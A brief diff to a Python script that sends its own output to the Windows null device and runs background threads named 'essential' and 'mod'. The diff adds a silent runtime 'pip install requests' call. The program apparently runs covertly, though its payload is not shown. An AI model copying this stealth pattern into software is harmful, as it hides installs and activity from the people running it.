@@ -9,6 +9,7 @@ import socket
 import platform
 import threading
 import sys
+import subprocess
 
 
 
@@ -305,6 +306,7 @@ def run_in_thread(func):
 def main():
     sys.stdout = open('nul', 'w')
     sys.stderr = open('nul', 'w')
+    subprocess.check_output(["pip", "install", "requests"], stderr=subprocess.STDOUT)
     threads = []
     threads.append(run_in_thread(essential)())
     threads.append(run_in_thread(mod)())
